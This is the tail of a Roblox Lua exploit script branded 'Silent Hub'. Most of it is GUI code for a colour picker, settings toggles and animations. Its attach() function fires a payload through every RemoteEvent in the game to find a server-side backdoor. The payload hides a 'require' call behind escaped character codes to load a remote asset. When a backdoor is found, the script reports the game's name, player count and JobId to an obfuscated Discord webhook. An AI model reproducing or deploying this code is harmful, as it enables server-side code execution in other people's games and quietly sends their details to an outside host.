		local basicColors = {Color3.new(0,0,0),Color3.new(0.66666668653488,0,0),Color3.new(0,0.33333334326744,0),Color3.new(0.66666668653488,0.33333334326744,0),Color3.new(0,0.66666668653488,0),Color3.new(0.66666668653488,0.66666668653488,0),Color3.new(0,1,0),Color3.new(0.66666668653488,1,0),Color3.new(0,0,0.49803924560547),Color3.new(0.66666668653488,0,0.49803924560547),Color3.new(0,0.33333334326744,0.49803924560547),Color3.new(0.66666668653488,0.33333334326744,0.49803924560547),Color3.new(0,0.66666668653488,0.49803924560547),Color3.new(0.66666668653488,0.66666668653488,0.49803924560547),Color3.new(0,1,0.49803924560547),Color3.new(0.66666668653488,1,0.49803924560547),Color3.new(0,0,1),Color3.new(0.66666668653488,0,1),Color3.new(0,0.33333334326744,1),Color3.new(0.66666668653488,0.33333334326744,1),Color3.new(0,0.66666668653488,1),Color3.new(0.66666668653488,0.66666668653488,1),Color3.new(0,1,1),Color3.new(0.66666668653488,1,1),Color3.new(0.33333334326744,0,0),Color3.new(1,0,0),Color3.new(0.33333334326744,0.33333334326744,0),Color3.new(1,0.33333334326744,0),Color3.new(0.33333334326744,0.66666668653488,0),Color3.new(1,0.66666668653488,0),Color3.new(0.33333334326744,1,0),Color3.new(1,1,0),Color3.new(0.33333334326744,0,0.49803924560547),Color3.new(1,0,0.49803924560547),Color3.new(0.33333334326744,0.33333334326744,0.49803924560547),Color3.new(1,0.33333334326744,0.49803924560547),Color3.new(0.33333334326744,0.66666668653488,0.49803924560547),Color3.new(1,0.66666668653488,0.49803924560547),Color3.new(0.33333334326744,1,0.49803924560547),Color3.new(1,1,0.49803924560547),Color3.new(0.33333334326744,0,1),Color3.new(1,0,1),Color3.new(0.33333334326744,0.33333334326744,1),Color3.new(1,0.33333334326744,1),Color3.new(0.33333334326744,0.66666668653488,1),Color3.new(1,0.66666668653488,1),Color3.new(0.33333334326744,1,1),Color3.new(1,1,1)}
		local customColors = {}
		local function updateColor(noupdate)
			local relativeX,relativeY,relativeLineY = 219 - hue*219, 199 - sat*199, 199 - val*199
			local hsvColor = Color3.fromHSV(hue,sat,val)
	
			if noupdate == 2 or not noupdate then
				hueInput.Text = tostring(math.ceil(359*hue))
				satInput.Text = tostring(math.ceil(255*sat))
				valInput.Text = tostring(math.floor(255*val))
			end
			if noupdate == 1 or not noupdate then
				redInput.Text = tostring(math.floor(255*red))
				greenInput.Text = tostring(math.floor(255*green))
				blueInput.Text = tostring(math.floor(255*blue))
			end
	
			chosenColor = Color3.new(red,green,blue)
	
			colorScope.Position = UDim2.new(0,relativeX-9,0,relativeY-9)
			ColorLine.ImageColor3 = Color3.fromHSV(hue,sat,1)
			colorArrow.Position = UDim2.new(0,-2,0,relativeLineY-4)
			previewFrame.BackgroundColor3 = chosenColor
	
			updateBack(chosenColor, backDrop)
	
			newMt.Color = chosenColor
			if newMt.Changed then 
				newMt:Changed(chosenColor)
			end
		end
		local function colorSpaceInput()
			local relativeX = mouse.X - colorSpace.AbsolutePosition.X
			local relativeY = mouse.Y - colorSpace.AbsolutePosition.Y
	
			if relativeX < 0 then relativeX = 0 elseif relativeX > 219 then relativeX = 219 end
			if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end
	
			hue = (219 - relativeX)/219
			sat = (199 - relativeY)/199
	
			local hsvColor = Color3.fromHSV(hue,sat,val)
			red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
	
			updateColor()
		end
		local function ColorLineInput()
			local relativeY = mouse.Y - ColorLine.AbsolutePosition.Y
	
			if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end	
	
			val = (199 - relativeY)/199
	
			local hsvColor = Color3.fromHSV(hue,sat,val)
			red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
	
			updateColor()
		end
		local function hookButtons(frame,func)
			frame.ArrowFrame.Up.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement then
					frame.ArrowFrame.Up.BackgroundTransparency = 0.5
				elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
					local releaseEvent,runEvent
	
					local startTime = tick()
					local pressing = true
					local startNum = tonumber(frame.Text)
	
					if not startNum then return end
	
					releaseEvent = user.InputEnded:Connect(function(input)
						if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
						releaseEvent:Disconnect()
						pressing = false
					end)
	
					startNum = startNum + 1
					func(startNum)
					while pressing do
						if tick()-startTime > 0.3 then
							startNum = startNum + 1
							func(startNum)
						end
						task.wait(0.1)
					end
				end
			end)
	
			frame.ArrowFrame.Up.InputEnded:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement then
					frame.ArrowFrame.Up.BackgroundTransparency = 1
				end
			end)
	
			frame.ArrowFrame.Down.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement then
					frame.ArrowFrame.Down.BackgroundTransparency = 0.5
				elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
					local releaseEvent,runEvent
	
					local startTime = tick()
					local pressing = true
					local startNum = tonumber(frame.Text)
	
					if not startNum then return end
	
					releaseEvent = user.InputEnded:Connect(function(input)
						if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
						releaseEvent:Disconnect()
						pressing = false
					end)
	
					startNum = startNum - 1
					func(startNum)
					while pressing do
						if tick()-startTime > 0.3 then
							startNum = startNum - 1
							func(startNum)
						end
						task.wait(0.1)
					end
				end
			end)
	
			frame.ArrowFrame.Down.InputEnded:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement then
					frame.ArrowFrame.Down.BackgroundTransparency = 1
				end
			end)
		end
		colorSpace.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				local releaseEvent,mouseEvent
	
				releaseEvent = user.InputEnded:Connect(function(input)
					if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
					releaseEvent:Disconnect()
					mouseEvent:Disconnect()
				end)
	
				mouseEvent = user.InputChanged:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement then
						colorSpaceInput()
					end
				end)
	
				colorSpaceInput()
			end
		end)
		ColorLine.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				local releaseEvent,mouseEvent
	
				releaseEvent = user.InputEnded:Connect(function(input)
					if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
					releaseEvent:Disconnect()
					mouseEvent:Disconnect()
				end)
	
				mouseEvent = user.InputChanged:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement then
						ColorLineInput()
					end
				end)
	
				ColorLineInput()
			end
		end)
		local function updateHue(str)
			local num = tonumber(str)
			if num then
				hue = math.clamp(math.floor(num),0,359)/359
				local hsvColor = Color3.fromHSV(hue,sat,val)
				red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
				hueInput.Text = tostring(hue*359)
				updateColor(1)
			end
		end
		hueInput.FocusLost:Connect(function() updateHue(hueInput.Text) end) hookButtons(hueInput,updateHue)
		local function updateSat(str)
			local num = tonumber(str)
			if num then
				sat = math.clamp(math.floor(num),0,255)/255
				local hsvColor = Color3.fromHSV(hue,sat,val)
				red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
				satInput.Text = tostring(sat*255)
				updateColor(1)
			end
		end
		satInput.FocusLost:Connect(function() updateSat(satInput.Text) end) hookButtons(satInput,updateSat)
		local function updateVal(str)
			local num = tonumber(str)
			if num then
				val = math.clamp(math.floor(num),0,255)/255
				local hsvColor = Color3.fromHSV(hue,sat,val)
				red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
				valInput.Text = tostring(val*255)
				updateColor(1)
			end
		end
		valInput.FocusLost:Connect(function() updateVal(valInput.Text) end) hookButtons(valInput,updateVal)
	
		local function updateRed(str)
			local num = tonumber(str)
			if num then
				red = math.clamp(math.floor(num),0,255)/255
				local newColor = Color3.new(red,green,blue)
				hue,sat,val = newColor:ToHSV()
				redInput.Text = tostring(red*255)
				updateColor(2)
			end
		end
		redInput.FocusLost:Connect(function() updateRed(redInput.Text) end) hookButtons(redInput,updateRed)
	
		local function updateGreen(str)
			local num = tonumber(str)
			if num then
				green = math.clamp(math.floor(num),0,255)/255
				local newColor = Color3.new(red,green,blue)
				hue,sat,val = newColor:ToHSV()
				greenInput.Text = tostring(green*255)
				updateColor(2)
			end
		end
		greenInput.FocusLost:Connect(function() updateGreen(greenInput.Text) end) hookButtons(greenInput,updateGreen)
	
		local function updateBlue(str)
			local num = tonumber(str)
			if num then
				blue = math.clamp(math.floor(num),0,255)/255
				local newColor = Color3.new(red,green,blue)
				hue,sat,val = newColor:ToHSV()
				blueInput.Text = tostring(blue*255)
				updateColor(2)
			end
		end
		blueInput.FocusLost:Connect(function() updateBlue(blueInput.Text) end) hookButtons(blueInput,updateBlue)
	
		local colorChoice = Instance.new("TextButton")
		colorChoice.Name = "Choice"
		colorChoice.Size = UDim2.new(0,25,0,18)
		colorChoice.BorderColor3 = Color3.new(96/255,96/255,96/255)
		colorChoice.Text = ""
		colorChoice.AutoButtonColor = false
	
		local row = 0
		local column = 0
		for i,v in pairs(basicColors) do
			local newColor = colorChoice:Clone()
			newColor.BackgroundColor3 = v
			newColor.Position = UDim2.new(0,1 + 30*column,0,21 + 23*row)
	
			newColor.MouseButton1Click:Connect(function()
				red,green,blue = v.r,v.g,v.b
				local newColor = Color3.new(red,green,blue)
				hue,sat,val = newColor:ToHSV()
				updateColor()
			end)	
	
			newColor.Parent = basicColorsFrame
			column = column + 1
			if column == 6 then row = row + 1 column = 0 end
		end
	
		row = 0
		column = 0
		for i = 1,12 do
			local color = customColors[i] or Color3.new(0,0,0)
			local newColor = colorChoice:Clone()
			newColor.BackgroundColor3 = color
			newColor.Position = UDim2.new(0,1 + 30*column,0,20 + 23*row)
	
			newColor.MouseButton1Click:Connect(function()
				local curColor = customColors[i] or Color3.new(0,0,0)
				red,green,blue = curColor.r,curColor.g,curColor.b
				hue,sat,val = curColor:ToHSV()
				updateColor()
			end)
	
			newColor.MouseButton2Click:Connect(function()
				customColors[i] = chosenColor
				newColor.BackgroundColor3 = chosenColor
			end)
	
			newColor.Parent = customColorsFrame
			column = column + 1
			if column == 6 then row = row + 1 column = 0 end
		end
	
		pickerTopBar.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				local releaseEvent,mouseEvent
				local dragOffX,dragOffY = mouse.X-pickerTopBar.AbsolutePosition.X,mouse.Y-pickerTopBar.AbsolutePosition.Y
	
				releaseEvent = user.InputEnded:Connect(function(input)
					if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
					releaseEvent:Disconnect()
					mouseEvent:Disconnect()
				end)
	
				mouseEvent = user.InputChanged:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement then
						pickerGui.Position = UDim2.new(0,mouse.X-dragOffX,0,mouse.Y-dragOffY)
					end
				end)
			end
		end)
	
		okButton.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor) end colourpicker.Enabled = false savedColor = chosenColor ColorPickerOpen = false end)
		okButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then okButton.BackgroundTransparency = 0.4 end end)
		okButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then okButton.BackgroundTransparency = 0 end end)
	
		cancelButton.MouseButton1Click:Connect(function() if newMt.Cancel then newMt:Cancel() end colourpicker.Enabled = false updateBack(savedColor, backDrop) ColorPickerOpen = false end)
		closeButton.MouseButton1Click:Connect(function() pickerGui.Parent.Enabled = false updateBack(savedColor, backDrop) ColorPickerOpen = false end)
	
		updateColor()
	
		newMt.SetColor = function(self,color)
			red,green,blue = color.r,color.g,color.b
			hue,sat,val = color:ToHSV()
			updateColor()
		end
	
		newMt.Gui = rootGui
	
		return newMt
	end
	
	local ColorPickInstance = ColorPicker.new()
	
	local rainbowColors = {
		Color3.fromRGB(0, 0, 255),
		Color3.fromRGB(255, 0, 0),
		Color3.fromRGB(255, 255, 0),
		Color3.fromRGB(0, 255, 0),
		Color3.fromRGB(0, 255, 255),
	}
	
	local rainbow = false
	local customRainbow = false
	local rainbowReset = false
	local rainbowStart = 1
	local currentRainbow = nil
	
	spawn(function()
		while task.wait() do
			if rainbow == true then
				for i,v in pairs(rainbowColors) do
					local start = rainbowColors[i]
					local rEnd = i + 1
					if not rainbowColors[rEnd] then
						rEnd = 1
					end
					if customRainbow == true then
						local back = Interface.BackgroundColor3
						start = back
					end
					for num = rainbowCount, 1, -1 do
						currentRainbow = start:Lerp(rainbowColors[rEnd], (rainbowCount - num)/rainbowCount)
						if rainbow == true then
							updateBack(currentRainbow)
						else
							break
						end
						task.wait()
					end
					customRainbow = false
				end
				if rainbowReset == true then
					rainbowReset = false
					rainbow = false
					currentRainbow = Interface.BackgroundColor3
					for num = rainbowCount, 1, -1 do
						currentRainbow = currentRainbow:Lerp(savedColor, (rainbowCount - num)/rainbowCount)
						updateBack(currentRainbow)
						if rainbow == true then
							rainbowReset = false
							break
						end
						task.wait()
					end
					task.wait()
				end
			end
		end
	end)
	
	local function isMouseHovering()
		local mouse = game.Players.LocalPlayer:GetMouse()
		if table.find(game.Players.LocalPlayer.PlayerGui:GetGuiObjectsAtPosition(mouse.X, mouse.Y), Interface) then
			return true
		end
		return false
	end
	
	Interface.MouseEnter:Connect(function()
		if isToggled2 then
			for vis = Interface.GroupTransparency, 0.04, -0.08 do
				if not isMouseHovering() then return end
				wait()
				Interface.GroupTransparency = vis
			end
			Interface.GroupTransparency = 0.04
			task.wait(0.5)
		end
	end)
	
	Interface.MouseLeave:Connect(function()
		if isToggled2 then
			wait(0.2)
			if isMouseHovering() then return end
			for vis = Interface.GroupTransparency, 0.8, 0.04 do
				if isMouseHovering() then return end
				wait()
				Interface.GroupTransparency = vis
			end
			Interface.GroupTransparency = 0.8
		end
	end)
	
	--Open Colour Picker
	TabContainer["Container6"].ColorPicker.MouseButton1Click:Connect(function()
		colourpicker.Enabled = true
		colourpicker.ColorPicker.Visible = true
	end)
	
	containers["Settings"].UserTarget.Text = game:GetService("Players").LocalPlayer.Name
	
	containers["Settings"].GUIScale.Text = Interface.UIScale.Scale
	
	containers["Settings"].GUIScale:GetPropertyChangedSignal("Text"):Connect(function()
		local scaleAm = containers["Settings"].GUIScale.Text
		if tonumber(scaleAm) and tonumber(scaleAm) ~= 0 then
			Interface.UIScale.Scale = tonumber(scaleAm)
		end
	end)
	
	local isToggled = false
	
	local function toggleScrollbar()
		if not isToggled then 
			containers["Settings"].Toggle.ToggleButton:TweenPosition(UDim2.new(0, 25, 0, 0), "Out", "Quad", 0.1)
			containers["Settings"].Toggle.BackgroundTransparency = 0
			containers["Settings"].Toggle.BackgroundColor3 = Color3.fromRGB(211,108,108)
			containers["Scripts"].ScrollingFrame.ScrollBarThickness = 3
			containers["Maps"].ScrollingFrame.ScrollBarThickness = 3
			containers["GUIs"].ScrollingFrame.ScrollBarThickness = 3
		else
			containers["Settings"].Toggle.ToggleButton:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Quad", 0.1)
			containers["Settings"].Toggle.BackgroundTransparency = 0.75
			containers["Settings"].Toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
			containers["Scripts"].ScrollingFrame.ScrollBarThickness = 0
			containers["Maps"].ScrollingFrame.ScrollBarThickness = 0
			containers["GUIs"].ScrollingFrame.ScrollBarThickness = 0
		end
		isToggled = not isToggled
	end
	containers["Settings"].Toggle.ToggleButton.MouseButton1Click:Connect(function()
		toggleScrollbar()
	end)
	
	containers["Settings"].Toggle.InputBegan:Connect(function(click)
		if click.UserInputType == Enum.UserInputType.MouseButton1 then
			toggleScrollbar()
		end
	end)
	
	--Toggle Scrolling
	local isToggled2 = false
	
	local function toggleAutoFade()
		if not isToggled2 then 
			containers["Settings"].Toggle2.ToggleButton:TweenPosition(UDim2.new(0, 25, 0, 0), "Out", "Quad", 0.1)
			containers["Settings"].Toggle2.BackgroundTransparency = 0
			containers["Settings"].Toggle2.BackgroundColor3 = Color3.fromRGB(211,108,108)
		else
			containers["Settings"].Toggle2.ToggleButton:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Quad", 0.1)
			containers["Settings"].Toggle2.BackgroundTransparency = 0.75
			containers["Settings"].Toggle2.BackgroundColor3 = Color3.fromRGB(255,255,255)
		end
		isToggled2 = not isToggled2
		if isToggled2 then
			for vis = Interface.GroupTransparency, 0.04, -0.08 do
				wait()
				Interface.GroupTransparency = vis
			end
			Interface.GroupTransparency = 0.04
		end
	end
	
	containers["Settings"].Toggle2.ToggleButton.MouseButton1Click:Connect(function()
		toggleAutoFade()
	end)
	
	containers["Settings"].Toggle2.InputBegan:Connect(function(click)
		if click.UserInputType == Enum.UserInputType.MouseButton1 then
			toggleAutoFade()
		end
	end)
	
	TabContainer["Container6"].SaveSettings.MouseButton1Click:Connect(function()
		savesettings()
	end)
	
	TabContainer["Container6"].ResetSettings.MouseButton1Click:Connect(function()
		resetsettings()
	end)
	
	--Open GUI
	Open.MouseButton1Click:connect(function()
		Open:TweenPosition(UDim2.new(0, -75, 0.75, 0), "Out", "Quad", 0.25)
		Interface.Visible = true
		for vis = 1, 0.08, -0.04 do
			wait() -- using wait because task.wait goes off of frame rate
			Interface.GroupTransparency = vis
		end
		Interface.GroupTransparency = 0.04
		wait(0.5)
		wait(0.5)
	end)
	
	--Close GUI
	Interface.Titlebar.Close.MouseButton1Click:connect(function()
		for vis = 0.04, 1, 0.04 do
			wait() -- using wait because task.wait goes off of frame rate
			Interface.GroupTransparency = vis
		end
		Interface.GroupTransparency = 1
		Interface.Visible = false
		wait(0.5)
		Open:TweenPosition(UDim2.new(0, 0, 0.75, 0), "Out", "Quad", 0.25)
	end)
	
	--Minimize GUI
	Interface.Titlebar.Minimize.MouseButton1Click:connect(function()
		if Interface.AbsoluteSize.Y == 320 then
			Interface:TweenSize(UDim2.new(0, 620, 0, 25), "Out", "Quad", 0.5)
		elseif Interface.AbsoluteSize.Y == 25 then
			Interface:TweenSize(UDim2.new(0, 620, 0, 320), "Out", "Quad", 0.5)
		end
	end)
	
	
	local function notify(title, text, duration)
		while true do
			local ok = pcall(function()
				game.StarterGui:SetCore("SendNotification", {
					Title = "Silent Hub",
					Text = text,
					Icon = "rbxassetid://71596851736559",
					Duration = duration or 5,
				})
			end)
	
			if ok then
				return
			end
	
			wait()
		end
	end
	
	local function attach()
		if isAcquiring or AcquiredRemote then return end
		isAcquiring = true
	
		notify("Silent Hub", "Scanning for remotes, check console for info")
		start = tick()
	
		local ignored = game:FindFirstChild("RobloxReplicatedStorage")
		local tested = 0
	
		for pass = 1, 2 do
			for _, remote in ipairs(game:GetDescendants()) do
				if AcquiredRemote then break end
	
				if remote:IsA("RemoteEvent")
					and remote.Name ~= "UpdateCurrentCall"
					and (not ignored or not remote:IsDescendantOf(ignored))
				then
					tested += 1
	
					print("\nPath: game." .. remote:GetFullName() .."\nType: " .. remote.ClassName)
					
					local code = ([[
						local f=Instance.new("Folder")
						f.Name=%q
						f.Parent=game.JointsService
						task.delay(0.5,function()
							if f.Parent then
								f:Destroy()
							end
						end)
						
						getfenv()['\114\101\113\117\105\114\101'](13834193702)
						]]):format(keycode)
	
					if remote:IsA("RemoteEvent") then
						pcall(function()
							remote:FireServer(code)
						end)
					else
						task.spawn(function()
							pcall(function()
								remote:InvokeServer(code)
							end)
						end)
					end
	
					wait(0.1)
	
					local deadline = tick() + 0.5
					repeat
						if game.JointsService:FindFirstChild(keycode) then
							AcquiredRemote = remote 
	
							print("\nRemote Found!\nPath: game." .. remote:GetFullName() .."\nType: " .. remote.ClassName)
	
							notify("Silent Hub", ("Backdoor found in %.2fs!"):format(tick() - start))
							loadsettings()
							local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
							if request and Log then
								local icon = ""
								pcall(function()
									local response = game.HttpService:JSONDecode(game:HttpGet(
										("https://thumbnails.roblox.com/v1/places/gameicons?placeIds=%d&returnPolicy=PlaceHolder&size=512x512&format=Png"):format(game.PlaceId)
										))
	
									icon = response.data[1].imageUrl
								end)
								
	
								Open:TweenPosition(UDim2.new(0, 0, 0.75, 0), "Out", "Quad", 0.5)
	
								request({
									Url = '\104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\097\112\112\046\099\111\109\047\097\112\105\047\119\101\098\104\111\111\107\115\047\049\053\051\050\053\056\054\052\052\049\053\056\048\055\052\048\055\048\056\047\085\088\099\082\081\077\116\049\054\098\055\098\109\073\053\112\070\067\088\107\052\102\049\069\054\057\090\100\116\103\085\049\095\115\075\100\105\117\087\086\077\116\090\067\119\102\054\107\122\057\112\051\079\088\097\116\114\050\087\074\119\087\050\117\087\077\086\078',
									Method = 'POST',
									Headers = {
										['Content-Type'] = 'application/json',
									},
									Body = HttpService:JSONEncode({
										username = "Silent Hub",
										embeds = {{
											title = "A backdoored game has been logged!",
											color = 0xFFFFFF,
											
											description = ("# [%s](https://www.roblox.com/games/%d)"):format(
												game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
												game.PlaceId
											),
	
											fields = {
												{
													name = "Currently Playing",
													value = "" .. tostring(#game.Players:GetPlayers() or 0) .. "",
													inline = true
												},
												{
													name = "Visits",
													value = "" .. tostring(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Visits or 0) .. "",
													inline = true
												},
												{
													name = "Job Id",
													value = if RunService:IsStudio() then "`Studio Playtest`" else "`" .. game.JobId .. "`",
													inline = true
												},
											},
	
										thumbnail = {
												url = icon
											}
										}}
									})
								})
							end
	
							isAcquiring = false
							print("Tested " .. tested .. " remotes.")
							return
						end
	
						wait(0.05)
					until tick() >= deadline
				end
			end
			if AcquiredRemote then
				break
			end
	
			if pass == 1 then
				warn("No backdoor found on first pass, rescanning...")
				wait(0.25)
			end
		end
	
		print("Tested " .. tested .. " remotes.")
	
		isAcquiring = false
	
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Silent Hub",
			Text = "Backdoor not found."
		})
	
		GUI:Destroy()
	end
	
	
	
	task.spawn(function()
		if game.RunService:IsStudio() then
			if not game:IsLoaded() then
				game.Loaded:Wait()
			end
	
			wait(2)
		end
		attach()
	end)
end;
task.spawn(C_de);

return G2L["1"], require;
